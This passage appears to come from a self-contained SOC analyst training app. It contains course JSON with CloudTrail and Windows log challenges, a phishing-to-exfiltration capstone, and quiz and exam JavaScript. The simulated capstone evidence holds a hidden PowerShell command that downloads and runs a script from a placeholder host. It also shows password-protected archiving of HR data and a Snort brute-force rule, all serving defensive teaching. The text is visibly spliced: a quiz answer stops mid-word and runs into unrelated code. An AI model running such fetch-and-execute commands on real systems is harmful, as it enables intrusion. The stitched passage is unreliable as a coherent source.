issue"],"a":1,"why":"Misconfiguration is the leading cause of cloud data leaks."}],"chal":{"title":"A quiet night in the cloud","brief":"CloudTrail events from a company AWS account, followed by one Windows observation from the same week.","evidence":"# CloudTrail (simplified), account 4410-prod, 2026-11-14 UTC\n22:41:03  ConsoleLogin        user=dev-anna      sourceIP=102.129.145.20 (new country)  MFAUsed=No   result=Success\n22:43:17  ListUsers           user=dev-anna      sourceIP=102.129.145.20\n22:44:02  CreateUser          user=dev-anna      newUser=backup-admin\n22:44:20  AttachUserPolicy    user=dev-anna      target=backup-admin  policy=AdministratorAccess\n22:44:41  CreateAccessKey     user=dev-anna      target=backup-admin\n22:47:09  StopLogging         user=backup-admin  trail=org-main-trail  sourceIP=102.129.145.20\n22:52:30  RunInstances        user=backup-admin  type=p4d.24xlarge x8  region=ap-southeast-3\n\n# Domain controller DC-01, 2026-11-15\n03:20:11 to 03:20:54  Event 4769 x 46  Account=t.rotaru  Source=10.20.4.31\n                      46 different service names, Ticket Encryption Type=0x17","qs":[{"p":"Whose credentials were compromised first?","h":["1uwenxh5jag"],"hint":""},{"p":"Which user did the attacker create for persistence?","h":["10qki4edg6a"],"hint":""},{"p":"Which policy gave it full control?","h":["1cwbp9f914d"],"hint":""},{"p":"Which API call tried to blind the defenders?","h":["26o9j571r3s"],"hint":""},{"p":"What is the likely purpose of the 22:52:30 event?","h":["dhfv3fwqzt","gu250z4iof","k1xz7dwhrm","1bklbamzemc","nxjcjb5n71","t90472vpif"],"hint":""},{"p":"Name the attack seen on DC-01","h":["1zii5pv2wus","uq8sxbg1qr"],"hint":"One word"}]},"iv":[["What is the shared responsibility model?","The cloud provider secures the infrastructure it runs. The customer is responsible for what they configure and store: identities, permissions, network exposure, data and logging."],["Which cloud log events would worry you most?","A console login without MFA from a new location, creation of new users or access keys, admin policies being attached, logging being stopped or deleted, and storage being made public."],["Explain Kerberoasting and how to detect it.","Any domain user can request service tickets for accounts with an SPN. The ticket is encrypted with the service account's password hash, so it can be cracked offline. Detect a single account requesting many 4769 tickets, especially with RC4 encryption, in a short time."]],"res":[["video","Kerberos Authentication Explained: a deep dive","https://www.youtube.com/watch?v=5N242XcKAsM","YouTube",17,1],["read","The shared responsibility model","https://aws.amazon.com/compliance/shared-responsibility-model/","AWS",10,1],["practice","flaws.cloud: learn AWS mistakes by exploiting them, levels 1 to 3","http://flaws.cloud/","Scott Piper",60,0],["read","CloudTrail user guide: what gets logged","https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-user-guide.html","AWS docs",20,0],["read","T1558.003 Kerberoasting: detection section","https://attack.mitre.org/techniques/T1558/003/","MITRE ATT&CK",10,0],["video","Kerberos deep dive series","https://blog.compass-security.com/2025/09/taming-the-three-headed-dog-kerberos-deep-dive-series/","Compass Security",60,0],["read","ATT&CK Cloud matrix","https://attack.mitre.org/matrices/enterprise/cloud/","MITRE",15,0],["practice","flaws2.cloud: attacker and defender paths","http://flaws2.cloud/","Scott Piper",60,0],["read","IAM security best practices","https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html","AWS docs",15,0],["read","Hacking the Cloud: an encyclopedia of cloud attack techniques","https://hackingthe.cloud/","Hacking the Cloud",30,0],["tool","Stratus Red Team: generate real attack events in a test AWS account","https://stratus-red-team.cloud/","Datadog",30,0],["read","Sign-in logs in Microsoft Entra","https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-sign-ins","Microsoft Learn",15,0],["read","Active Directory security research","https://adsecurity.org/","Sean Metcalf",30,0]],"check":"I can list five risky CloudTrail events and explain Kerberoasting to a non-expert."},{"title":"One incident, start to finish","module":"Incident response and capstone","goal":"Investigate a multi-stage incident across mail, endpoint, proxy and Windows logs and write the report.","tasks":[["room","Tempest",1,"tempestincident","SOC Level 1 Capstone Challenges"],["room","Boogeyman 1",1,"boogeyman1","SOC Level 1 Capstone Challenges"],["room","Boogeyman 2",1,"boogeyman2","SOC Level 1 Capstone Challenges"],["room","Boogeyman 3",1,"boogeyman3","SOC Level 1 Capstone Challenges"],["own","After the capstone challenge below, write a one-page incident report using the week 10 template. Keep it as a work sample",1],["own","Review tab: clear every due question before the final exam",0.5]],"lesson":"\u003cp>This week you stop learning tools and prove you can connect them. The final exam and the capstone below are the evidence that the last three months worked.\u003c/p>\n\u003ch4>Incident response phases (NIST)\u003c/h4>\n\u003cpre>1. Preparation\n2. Detection and Analysis\n3. Containment, Eradication and Recovery\n4. Post-Incident Activity (lessons learned)\u003c/pre>\n\u003ch4>Investigation method\u003c/h4>\n\u003cpre>Anchor    start from the one thing you know (an alert, a host, a time)\nPivot     same host around that time; same user; same IP or domain elsewhere\nTimeline  one line per event, UTC, source of evidence noted\nScope     which hosts and accounts are touched? search every indicator company-wide\nReport    5 Ws, indicators, actions, recommendations\u003c/pre>\n\u003ch4>Evidence rules\u003c/h4>\u003cul>\u003cli>Order of volatility: memory first, then disk. Do not reboot an infected host before memory is captured.\u003c/li>\n\u003cli>Contain before you clean: isolate the host, disable the account, block the indicators.\u003c/li>\n\u003cli>Chain of custody: record who handled which evidence and when.\u003c/li>\u003c/ul>\n\u003ch4>What next\u003c/h4>\u003cp>If you pass the final exam at 80% or above and your SOC Simulator scores are steady, you are in range for the SAL1 certification. After that, SOC Level 2 and the Defending AWS and Azure paths lead toward the cloud security role you want.\u003c/p>","quiz":[{"q":"In the NIST incident response lifecycle, what follows Detection and Analysis?","o":["Preparation","Containment, Eradication and Recovery","Post-Incident Activity","Reconnaissance"],"a":1,"why":"Preparation; Detection and Analysis; Containment, Eradication and Recovery; Post-Incident Activity."},{"q":"A host is infected with fileless malware. A technician wants to reboot it. What do you say?","o":["Go ahead","No: isolate it and capture memory first, since a reboot destroys volatile evidence","Reinstall Windows first","Unplug the monitor"],"a":1,"why":"Memory holds the running malware, keys and connections. It is gone after a reboot."},{"q":"Which evidence should be collected first?","o":["Backups","RAM","Hard disk image","Printed documents"],"a":1,"why":"Order of volatility: the most short-lived data first."},{"q":"Which is a containment action?","o":["Writing the final report","Isolating the host from the network through EDR","Holding a lessons-learned meeting","Buying new licences"],"a":1,"why":"Containment limits spread while analysis continues."},{"q":"What is the purpose of the post-incident phase?","o":["Assign blame","Improve detections, processes and defences based on what happened","Delete the logs","Close tickets faster"],"a":1,"why":"Each incident should make the next one easier to detect and handle."},{"q":"Which pattern suggests lateral movement?","o":["A user browsing the intranet","Logon type 3 from one workstation to a server with a service account, then event 7045 PSEXESVC","A DNS lookup for a news site","A failed print job"],"a":1,"why":"Network logon plus remote service creation is the PsExec signature."},{"q":"What does chain of custody document?","o":["The attacker's steps","Who collected and handled each piece of evidence, and when","The firewall rules","Staff shift patterns"],"a":1,"why":"It keeps evidence trustworthy and usable in legal or disciplinary proceedings."}],"chal":{"title":"Capstone: the Northwind incident","brief":"Four log sources, one attack. Build a timeline first, then answer. Allow 45 minutes. This is the practical half of your final test.","evidence":"# All times UTC, 2026-11-10\n\n== MAIL GATEWAY ==\n08:41:07  from=\u003chr@payro11-update.example>  to=\u003cd.rusu@northwind.example>  subject=\"Salary adjustment 2026\"  attachment=Salary_2026.xlsm  verdict=delivered\n08:41:09  from=\u003chr@payro11-update.example>  to=\u003ca.popa@northwind.example>  subject=\"Salary adjustment 2026\"  attachment=Salary_2026.xlsm  verdict=quarantined\n\n== EDR (host WS-HR-014, 10.20.4.14, user d.rusu) ==\n08:52:31  excel.exe (pid 4412) opened C:\\Users\\d.rusu\\Downloads\\Salary_2026.xlsm\n08:52:48  excel.exe -> powershell.exe -w hidden -c \"iwr http://updates.cdn-metrics.example/s.ps1 | iex\"\n08:53:02  powershell.exe wrote C:\\ProgramData\\svchost32.exe\n08:53:05  reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\ProgramData\\svchost32.exe\n09:40:12  svchost32.exe read memory of lsass.exe\n\n== PROXY ==\n08:52:50  10.20.4.14  GET   http://updates.cdn-metrics.example/s.ps1          200  bytes_out=310       bytes_in=2048\n08:53:10  10.20.4.14  POST  https://updates.cdn-metrics.example/api/ping      200  bytes_out=412       bytes_in=96     (repeats every 60 s)\n11:20:14  10.20.9.5   POST  https://updates.cdn-metrics.example/upload        200  bytes_out=734003200 bytes_in=120\n\n== WINDOWS EVENTS (host FS-01, 10.20.9.5, file server) ==\n10:14:22  4625  Account=svc_filesync  LogonType=3  Source=10.20.4.14\n10:14:40  4625  Account=svc_filesync  LogonType=3  Source=10.20.4.14\n10:15:03  4624  Account=svc_filesync  LogonType=3  Source=10.20.4.14\n10:15:40  7045  Service installed: PSEXESVC\n11:05:09  4688  Process=7z.exe  CommandLine=\"7z a -pS3cret C:\\Temp\\hr.7z D:\\Shares\\HR\\*\"  Account=svc_filesync","qs":[{"p":"Hostname of patient zero","h":["1vn1jux7j7q"],"hint":""},{"p":"File name of the malicious attachment","h":["22n68yu79wg"],"hint":""},{"p":"Time of the first malicious code execution (HH:MM:SS)","h":["eezzmfh6e"],"hint":""},{"p":"C2 domain","h":["2d30tlvhxg1","ugoimgfk7h","19nkkxtct7a"],"hint":""},{"p":"ATT&CK technique ID (with sub-technique) for the persistence at 08:53:05","h":["jrvz3y58nc"],"hint":"T####.###"},{"p":"Which account was used for lateral movement?","h":["101u3s7dlmz"],"hint":""},{"p":"Which tool does event 7045 on FS-01 point to?","h":["bh3z4x0ohu","qofd18qz4v","1jqh478zmk3"],"hint":""},{"p":"From which host was data exfiltrated?","h":["4wcz1nx3rf"],"hint":"Hostname"},{"p":"Roughly how much data left, in MB (whole number)?","h":["1r2l29hmoqk","h1qehrslwt","1xty7po58is","h6t4laystj"],"hint":"bytes / 1024 / 1024"}]},"iv":[["Walk me through the incident response lifecycle.","Preparation, detection and analysis, containment eradication and recovery, and post-incident activity. It is a loop: new findings during containment send you back to analysis."],["A host is confirmed infected. What do you do first?","Contain without destroying evidence: isolate it from the network through EDR, do not reboot, capture memory if required, then continue analysis and scoping."],["How do you know an incident is fully scoped?","When every indicator and behaviour found has been searched across the whole environment and no new affected hosts or accounts appear, and the initial access and timeline are explained without gaps."]],"res":[["read","NIST SP 800-61 Rev. 3, incident response recommendations","https://csrc.nist.gov/pubs/sp/800/61/r3/final","NIST",30,1],["read","A second full intrusion report. Rebuild its timeline from memory afterwards","https://thedfirreport.com/","The DFIR Report",40,1],["practice","One more traffic analysis exercise, timed","https://www.malware-traffic-analysis.net/training-exercises.html","malware-traffic-analysis.net",60,0],["practice","A blue team lab of your choice, timed","https://cyberdefenders.org/blueteam-ctf-challenges/","CyberDefenders",90,0],["read","SAL1 certification page, if you decide to book it","https://tryhackme.com/certification/security-analyst-level-1","TryHackMe",10,0],["read","Curated list of incident response tools and resources","https://github.com/meirwah/awesome-incident-response","GitHub, meirwah",20,0],["tool","Volatility: the standard memory forensics framework","https://volatilityfoundation.org/","Volatility Foundation",30,0],["read","Known Exploited Vulnerabilities catalogue","https://www.cisa.gov/known-exploited-vulnerabilities-catalog","CISA",10,0],["read","Path outline: check nothing in SOC Level 1 is left unfinished","https://tryhackme.com/path/outline/soclevel1","TryHackMe",10,0]],"check":"I can name the NIST phases and explain why memory is captured before a reboot."}],"stages":[{"name":"Networks and frameworks","weeks":[1,2,3],"blurb":"Speak the language of attacks and read traffic.","extra":[{"q":"Wireshark shows one source sending SYN packets to ports 1 to 1024 of a server within two seconds. Most replies are RST. What are you looking at?","o":["A DDoS attack","A port scan","Normal browsing","DNS tunnelling"],"a":1,"why":"Sequential ports, SYN only, mostly RST replies: a scan mapping open services."},{"q":"Your team can either block the attacker's current file hash or write a detection for how their loader behaves. Which hurts the attacker more, and why?","o":["The hash, because it is exact","The behaviour, because changing TTPs is costly while a hash changes with one byte","Both are equal","Neither has any effect"],"a":1,"why":"Top of the Pyramid of Pain versus the bottom."},{"q":"A host sends ICMP echo requests with 1,400-byte payloads to one external IP continuously for an hour. What should you suspect?","o":["A broken cable","ICMP tunnelling or exfiltration","A Windows update","ARP poisoning"],"a":1,"why":"Normal pings are small and brief. Large, sustained ICMP payloads can carry data."},{"q":"What does this Snort rule detect? alert tcp any any -> $HOME_NET 22 (flags:S; threshold: type both, track by_src, count 20, seconds 60; sid:1000010;)","o":["Any SSH login","A single source opening 20 or more SSH connections in a minute, typical of brute force","SSH key exchange errors","Outbound SSH"],"a":1,"why":"The threshold tracks SYNs per source toward port 22."},{"q":"An analyst sees regular HTTPS connections from a server to a domain registered yesterday. Which Kill Chain phase does this most likely belong to?","o":["Reconnaissance","Delivery","Command and Control","Weaponization"],"a":2,"why":"An already compromised host talking to attacker infrastructure is C2."},{"q":"ATT&CK lists T1046 \"Network Service Discovery\" under which tactic?","o":["Initial Access","Discovery","Exfiltration","Impact"],"a":1,"why":"Scanning for services from inside a network is Discovery."}]},{"name":"Email, web and Windows","weeks":[4,5,6],"blurb":"The three places most alerts come from.","extra":[{"q":"An email passes SPF and DKIM for cornpany-payments.example. The display name says \"Company Payments\". What is the right conclusion?","o":["It is safe, authentication passed","Authentication only proves the sending domain; this is a lookalike domain","DKIM is broken","It must be internal"],"a":1,"why":"Passing checks for an attacker-owned lookalike domain proves nothing about legitimacy."},{"q":"The Security log shows event 4625 for 150 different accounts from one source, one attempt each, in five minutes. What is this?","o":["Brute force on one account","Password spraying","Kerberoasting","A misconfigured printer"],"a":1,"why":"One or two common passwords tried across many accounts stays under lockout thresholds."},{"q":"On a server you see 4624 type 3 from a workstation, followed by 7045 \"PSEXESVC\". What happened?","o":["A Windows update","Remote command execution with PsExec, likely lateral movement","An RDP session","A backup job"],"a":1,"why":"PsExec authenticates over SMB and installs a temporary service."},{"q":"The web log shows a burst of 500 errors on requests containing UNION SELECT, then 200 responses with large sizes. What is the best reading?","o":["The server crashed","SQL injection probing that eventually succeeded","A search-engine crawler","A load test"],"a":1,"why":"Errors while the attacker finds the right syntax, then data returned."},{"q":"A user received \"invoice.pdf.lnk\". Why is it dangerous?","o":["PDFs are always malicious","It is a shortcut that can run commands while looking like a PDF","It is too large","LNK files are encrypted"],"a":1,"why":"Windows hides the .lnk extension, and a shortcut can launch PowerShell with arguments."},{"q":"After a successful RDP logon, which pair of events would show the attacker creating a backdoor admin account?","o":["4634 then 4624","4720 then 4732","4768 then 4769","1102 then 4625"],"a":1,"why":"4720 account created, 4732 added to a local group such as Administrators."}]},{"name":"Linux, malware and SIEM","weeks":[7,8,9],"blurb":"Investigate hosts and query at scale.","extra":[{"q":"auth.log shows \"Accepted publickey for root\" from an unknown IP, and /root/.ssh/authorized_keys was modified yesterday. What happened?","o":["A password reset","The attacker added an SSH key for persistence","A normal admin login","A cron failure"],"a":1,"why":"An added public key gives password-less ac function quizIntro(w, wq) {
  return `<p>${D.weeks[w - 1].quiz.length} questions, feedback after each. Pass at ${Math.round(QPASS * 100)}%. Every question then enters your review schedule; wrong answers come back tomorrow.</p>
  <div class="row"><button class="btn" data-act="startQuiz" data-w="${w}">${wq ? 'Retake quiz' : 'Start quiz'}</button>${wq ? `<span class="chip ${wq.best >= QPASS ? 'good' : 'bad'}">Best ${Math.round(wq.best * 100)}%</span><span class="hint">${wq.n} attempt${wq.n > 1 ? 's' : ''}</span>` : ''}</div>`;
}
function chalHtml(w) {
  const C = D.weeks[w - 1].chal, c = S.ch[w] || { ok: [], tries: 0 };
  return `<p>${esc(C.brief)}</p>
  <div class="ev"><button class="btn ghost small" data-act="copy" data-w="${w}">Copy evidence</button><pre id="ev-${w}" tabindex="0">${esc(C.evidence)}</pre></div>
  ${C.qs.map((q, i) => `<div class="cq${c.ok[i] ? ' ok' : ''}" id="cq-${w}-${i}"><label for="ci-${w}-${i}"><b>${i + 1}.</b> ${esc(q.p)}</label>
    <div class="in"><input id="ci-${w}-${i}" autocomplete="off" spellcheck="false" data-w="${w}" data-i="${i}"${c.ok[i] ? ' value="Solved" disabled' : ''}>${c.ok[i] ? '<span class="chip good">Correct</span>' : `<button class="btn small" data-act="check" data-w="${w}" data-i="${i}">Check</button>`}<span class="hint" id="cm-${w}-${i}">${c.ok[i] ? '' : esc(q.hint || '')}</span></div></div>`).join('')}
  <p class="hint">${chalSolved(w)} of ${C.qs.length} solved &middot; ${c.tries} check${c.tries === 1 ? '' : 's'} used. Answers are not stored in readable form on this page, so the only way through is the evidence.</p>`;
}

/* quiz and review share one runner */
function startRun(ids, mode, w) {
  QS = { ids, mode, w, i: 0, right: 0, picked: null, order: {} };
  ids.forEach(id => QS.order[id] = shuffle(Q[id].o.map((_, i) => i)));
  drawRun();
}
function drawRun() {
  const box = $('#quiz'); if (!box || !QS) return;
  if (QS.i >= QS.ids.length) {
    const score = QS.right / QS.ids.length;
    let msg;
    if (QS.mode === 'week') {
      const p = S.wq[QS.w] || { best: 0, n: 0 }; p.best = Math.max(p.best, score); p.last = score; p.n++; S.wq[QS.w] = p; save();
      msg = `<p class="big">${QS.right}/${QS.ids.length}</p><p>${score >= QPASS ? 'Passed.' : 'Not passed yet. Re-read the coach notes and try again.'} These questions return in the Review tab on a 1, 3, 7, 14, 30 day schedule.</p><button class="btn" data-act="startQuiz" data-w="${QS.w}">Retake quiz</button>`;
    } else { save(); const left = dueIds().length; msg = `<p class="big">${QS.right}/${QS.ids.length}</p><p>${left ? left + ' more due.' : 'All caught up.'}</p>${left ? '<button class="btn" data-act="startReview">Continue</button>' : '<a class="btn" href="#today">Back to today</a>'}`; }
    QS = null; box.innerHTML = msg; nav(route().name); return;
  }
  const id = QS.ids[QS.i], q = Q[id], done = QS.picked !== null;
  box.innerHTML = `<div class="eyebrow">Question ${QS.i + 1} of ${QS.ids.length}${QS.mode === 'review' ? ' &middot; from week ' + q.week : ''}</div>
  <p class="qtext">${esc(q.q)}</p>
  <div class="opts">${QS.order[id].map(oi => `<button class="opt${done ? (oi === q.a ? ' right' : oi === QS.picked ? ' wrong' : '') : ''}" data-act="pick" data-o="${oi}"${done ? ' disabled' : ''}>${esc(q.o[oi])}</button>`).join('')}</div>
  ${done ? `<p class="why"><b>${QS.picked === q.a ? 'Correct.' : 'Not this time.'}</b> ${esc(q.why)}</p><button class="btn" data-act="nextQ">${QS.i + 1 < QS.ids.length ? 'Next question' : 'See result'}</button>` : ''}`;
}

function viewReview() {
  const due = dueIds(), all = Object.keys(S.q).filter(id => Q[id]);
  const boxes = [1, 2, 3, 4, 5].map(b => all.filter(id => S.q[id].b === b).length), mx = Math.max(1, ...boxes);
  const nextDue = all.length ? Math.min(...all.map(id => S.q[id].d)) : null;
  return `<div><h1>Review</h1><p class="lead">Questions you have answered come back just before you would forget them. A correct answer moves a question up one box and doubles the wait. A wrong one sends it back to box 1.</p></div>
  <div class="card"><h2>${due.length} due now</h2><div id="quiz">${due.length ? `<button class="btn" data-act="startReview">Start review (${Math.min(20, due.length)} questions)</button>` : all.length ? `<p>Nothing due. Next review on ${fmtDate(nextDue)}.</p>` : '<p>Take a week quiz first. Its questions will appear here on schedule.</p>'}</div></div>
  <div class="card"><h2>Memory boxes</h2><p class="lead">${all.length} questions in rotation. Box 5 means you answered correctly five times in a row over about two months.</p>
  <div class="boxes">${boxes.map((n, i) => `<div><span>${n}</span><i style="height:${Math.round(n / mx * 60)}px"></i><span>Box ${i + 1}<br>${IV[i + 1]} d</span></div>`).join('')}</div></div>`;
}

/* exams */
function examSpec(st) { const fin = !!D.stages[st - 1].final; return { fin, mins: fin ? 40 : 25, n: fin ? 30 : 20 }; }
function buildExam(st) {
  const sp = examSpec(st), extra = D.stages[st - 1].extra.map((_, i) => 's' + st + 'x' + (i + 1));
  let pool = [];
  if (sp.fin) for (let w = 1; w <= 12; w++) pool = pool.concat(shuffle(weekQids(w)).slice(0, 2));
  else pool = shuffle(D.stages[st - 1].weeks.flatMap(weekQids)).slice(0, sp.n - extra.length);
  return shuffle(extra.concat(pool));
}
function viewExam(st) {
  const s = D.stages[st - 1], sp = examSpec(st), e = S.ex[st], name = sp.fin ? 'Final exam' : 'Stage ' + st + ' exam';
  const head = `<div><div class="eyebrow"><a href="#roadmap">Roadmap</a> &middot; Stage ${st}</div><h1>${name}</h1><p class="lead">${esc(s.name)}${sp.fin ? '. Covers all 12 weeks.' : ''}</p></div>`;
  if (!unlocked(st)) return head + `<div class="card"><h2>Locked</h2><p>Pass the stage ${st - 1} exam first.</p><a class="btn" href="#exam-${st - 1}">Go to the stage ${st - 1} exam</a></div>`;
  if (ES && ES.stage === st && !ES.result) return head + examRunHtml();
  if (ES && ES.stage === st && ES.result) return head + examResultHtml();
  const wait = e && !e.passed && e.at ? e.at + COOLDOWN - Date.now() : 0;
  const ready = s.weeks.every(weekDone);
  return head + `<div class="card"><h2>Rules</h2>
  <ul><li>${sp.n} questions in ${sp.mins} minutes. It submits itself when time runs out.</li>
  <li>Pass mark ${Math.round(PASS * 100)}%. No feedback until you submit.</li>
  <li>${extraCount(st)} scenario questions appear only in this exam. The rest are drawn at random from ${sp.fin ? 'every week' : 'this stage'}.</li>
  <li>After a failed attempt you wait 12 hours. Use them to review what you missed.</li>
  <li>Closed book: no notes, no search, no AI. Leaving this page cancels the attempt.</li></ul>
  ${ready ? '' : `<p class="note">You have not finished every week in this stage. You may still sit the exam. If you already know the material, passing is the proof.</p>`}
  <div class="row"><button class="btn" data-act="startExam" data-s="${st}"${wait > 0 ? ' disabled' : ''}>${e ? 'Start new attempt' : 'Start exam'}</button>
  ${e ? examChip(st) + `<span class="hint">${e.n} attempt${e.n > 1 ? 's' : ''}</span>` : ''}${wait > 0 ? `<span class="hint">Next attempt possible in ${Math.ceil(wait / 36e5)} h</span>` : ''}</div></div>
  ${sp.fin ? `<div class="card"><h2>Practical half</h2><p>The final test has two halves. This exam checks knowledge. The week 12 capstone challenge checks that you can investigate. ${chalDone(12) ? '<span class="chip good">Capstone solved</span>' : '<a href="#week-12">Open the capstone</a>'}</p></div>` : ''}`;
}
const extraCount = st => D.stages[st - 1].extra.length;
function examRunHtml() {
  return `<div class="timer"><span>${Object.keys(ES.ans).length}/${ES.ids.length} answered</span><b id="clock">${clock()}</b></div>
  <div class="card">${ES.ids.map((id, n) => { const q = Q[id]; return `<div class="eq"><p class="qtext">${n + 1}. ${esc(q.q)}</p>${ES.order[id].map(oi => `<label><input type="radio" name="e-${id}" id="e-${id}-${oi}" data-act="ans" data-id="${id}" value="${oi}"${ES.ans[id] === oi ? ' checked' : ''}><span>${esc(q.o[oi])}</span></label>`).join('')}</div>`; }).join('')}
  <div class="row" style="margin-top:16px"><button class="btn" data-act="submitExam">Submit exam</button><span class="hint">Unanswered questions count as wrong.</span></div></div>`;
}
function clock() { const s = Math.max(0, Math.round((ES.ends - Date.now()) / 1000)); return String(Math.floor(s / 60)).padStart(2, '0') + ':' + String(s % 60).padStart(2, '0'); }
function startExam(st) {
  const ids = buildExam(st), sp = examSpec(st);
  ES = { stage: st, ids, ans: {}, order: {}, ends: Date.now() + sp.mins * 6e4, result: null };
  ids.forEach(id => ES.order[id] = shuffle(Q[id].o.map((_, i) => i)));
  clearInterval(esTimer);
  esTimer = setInterval(() => { if (!ES || ES.result) return clearInterval(esTimer); const c = $('#clock'); if (c) c.textContent = clock(); if (Date.now() >= ES.ends) submitExam(); }, 1000);
  render(); window.scrollTo(0, 0);
}
function submitExam() {
  if (!ES || ES.result) return;
  clearInterval(esTimer);
  const right = ES.ids.filter(id => ES.ans[id] === Q[id].a).length, score = right / ES.ids.length, pass = score >= PASS;
  ES.ids.forEach(id => { if (Q[id].week && ES.ans[id] !== Q[id].a) { const r = S.q[id] || { b: 0, d: 0, n: 0, c: 0 }; r.b = 1; r.d = Date.now(); r.n++; S.q[id] = r; } });
  const e = S.ex[ES.stage] || { best: 0, passed: false, n: 0 };
  e.best = Math.max(e.best, score); e.passed = e.passed || pass; e.n++; e.at = Date.now(); S.ex[ES.stage] = e;
  ES.result = { right, score, pass }; bump(5); save(); render(); window.scrollTo(0, 0);
}
function examResultHtml() {
  const r = ES.result, st = ES.stage, fin = examSpec(st).fin;
  const byWeek = {}; ES.ids.forEach(id => { const k = Q[id].week ? 'Week ' + Q[id].week : 'Scenarios'; byWeek[k] = byWeek[k] || [0, 0]; byWeek[k][1]++; if (ES.ans[id] === Q[id].a) byWeek[k][0]++; });
  return `<div class="card"><div class="row" style="justify-content:space-between"><div><p class="big">${Math.round(r.score * 100)}%</p><p>${r.right} of ${ES.ids.length} correct. ${r.pass ? (fin ? 'You passed the final exam.' : 'Passed. Stage ' + (st + 1) + ' is open.') : 'Below the ' + Math.round(PASS * 100) + '% pass mark. Missed questions are now due in Review. You can try again in 12 hours.'}</p></div><span class="chip ${r.pass ? 'good' : 'bad'}">${r.pass ? 'Passed' : 'Not passed'}</span></div>
  <div class="row">${Object.entries(byWeek).map(([k, v]) => `<span class="chip ${v[0] === v[1] ? 'good' : v[0] / v[1] < 0.6 ? 'bad' : ''}">${k} ${v[0]}/${v[1]}</span>`).join('')}</div>
  <div class="row" style="margin-top:14px">${r.pass ? (fin ? '<a class="btn" href="#today">Finish</a>' : `<a class="btn" href="#week-${st * 3 + 1}">Start week ${st * 3 + 1}</a>`) : '<a class="btn" href="#review">Review missed questions</a>'}<button class="btn ghost" data-act="closeExam">Close</button></div></div>
  <div class="card"><h2>Answers</h2>${ES.ids.map((id, n) => { const q = Q[id], a = ES.ans[id]; return `<div class="eq"><p class="qtext">${n + 1}. ${esc(q.q)}</p><p>${a === q.a ? `<span class="r">${esc(q.o[a])}</span>` : `${a === undefined ? '<span class="w">No answer</span>' : `<span class="w">${esc(q.o[a])}</span>`}<br><span class="r">${esc(q.o[q.a])}</span>`}</p><p class="why">${esc(q.why)}</p></div>`; }).join('')}</div>`;
}

/* ---------- transfer ---------- */
const stamp = () => new Date().toISOString().slice(0, 10);
const toCode = () => 'SOC12:' + btoa(unescape(encodeURIComponent(JSON.stringify(S))));
function moveMsg(t, bad) { const m = $('#moveMsg'); if (m) { m.textContent = t; m.style.color = bad ? 'var(--bad)' : 'var(--good)'; } }
function download(name, text, type) {
  try { const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([text], { type })); a.download = name; document.body.appendChild(a); a.click(); a.remove(); setTimeout(() => URL.revokeObjectURL(a.href), 4000); moveMsg('Saved "' + name + '" to your downloads. Send that file to the other PC.'); }
  catch (e) { moveMsg('The download was blocked here. Use "Copy progress code" instead.', true); }
}
function exportHtml() {
  S.updatedAt = S.updatedAt || Date.now();
  const root = document.documentElement.cloneNode(true);
  root.querySelector('#view').innerHTML = ''; root.querySelector('#nav').innerHTML = ''; root.removeAttribute('data-theme');
  root.querySelector('#seed').textContent = JSON.stringify(S).replace(/</g, '\\u003c');
  download('SOC Analyst in 12 Weeks (' + stamp() + ').html', '<!DOCTYPE html>\n' + root.outerHTML, 'text/html');
}
function parseProgress(text) {
  text = String(text).trim(); let obj = null;
  try {
    if (text.startsWith('SOC12:')) obj = JSON.parse(decodeURIComponent(escape(atob(text.slice(6)))));
    else if (text.startsWith('{')) obj = JSON.parse(text);
    else { const m = /<script id="seed" type="application\/json">([\s\S]*?)<\/script>/.exec(text); if (m) obj = JSON.parse(m[1]); }
  } catch (e) { obj = null; }
  return obj && typeof obj === 'object' && obj.tasks && obj.q && obj.ex ? obj : null;
}
let PENDING = null;
function offerImport(text) {
  const obj = parseProgress(text);
  if (!obj) return moveMsg('That is not a valid progress file or code.', true);
  PENDING = obj; const cur = overallPct(), keep = S; S = Object.assign(fresh(), obj); const inc = overallPct(); S = keep;
  const m = $('#moveMsg'); m.style.color = '';
  m.innerHTML = `Replace the progress on this PC (${cur}%) with the imported progress (${inc}%, last changed ${obj.updatedAt ? fmtDate(obj.updatedAt) : 'unknown'})? <button class="btn small" data-act="impYes">Yes, replace</button> <button class="btn ghost small" data-act="impNo">Cancel</button>`;
}

/* ---------- router and events ---------- */
function route() {
  const h = (location.hash || '#today').slice(1); let m;
  if ((m = /^week-(\d+)$/.exec(h)) && +m[1] >= 1 && +m[1] <= 12) return { name: 'week', n: +m[1] };
  if ((m = /^exam-(\d)$/.exec(h)) && +m[1] >= 1 && +m[1] <= 4) return { name: 'exam', n: +m[1] };
  if (h === 'roadmap' || h === 'review' || h === 'library' || h === 'cheatsheets') return { name: h };
  return { name: 'today' };
}
function render() {
  const r = route();
  if (ES && !(r.name === 'exam' && r.n === ES.stage)) { clearInterval(esTimer); ES = null; }
  QS = null; nav(r.name);
  $('#view').className = r.name === 'week' ? 'wide' : '';
  $('#view').innerHTML = r.name === 'week' ? viewWeek(r.n) : r.name === 'exam' ? viewExam(r.n) : r.name === 'roadmap' ? viewRoadmap() : r.name === 'library' ? viewLibrary() : r.name === 'cheatsheets' ? viewSheets() : r.name === 'review' ? viewReview() : viewToday();
}
window.addEventListener('hashchange', () => { render(); window.scrollTo(0, 0); });

function checkAnswer(w, i) {
  const inp = $('#ci-' + w + '-' + i), val = inp.value; if (!norm(val)) return;
  const q = D.weeks[w - 1].chal.qs[i], c = S.ch[w] || { ok: [], tries: 0 };
  c.tries++; const ok = q.h.includes(hash(norm(val)));
  if (ok) { c.ok[i] = true; bump(2); }
  S.ch[w] = c; save();
  if (ok) { const y = window.scrollY; render(); window.scrollTo(0, y); }
  else { $('#cq-' + w + '-' + i).classList.add('no'); $('#cm-' + w + '-' + i).textContent = 'Not correct. Go back to the evidence.' + (q.hint ? ' Hint: ' + q.hint : ''); }
}
document.addEventListener('click', ev => {
  const el = ev.target.closest('[data-act]'); if (!el) return;
  const a = el.dataset.act;
  if (a === 'task' || a === 'ans' || a === 'res' || a === 'rec' || a === 'impFile') return;
  if (a === 'jump') { ev.preventDefault(); const t = document.getElementById(el.dataset.to); if (t) t.scrollIntoView({ behavior: 'smooth', block: 'start' }); return; }
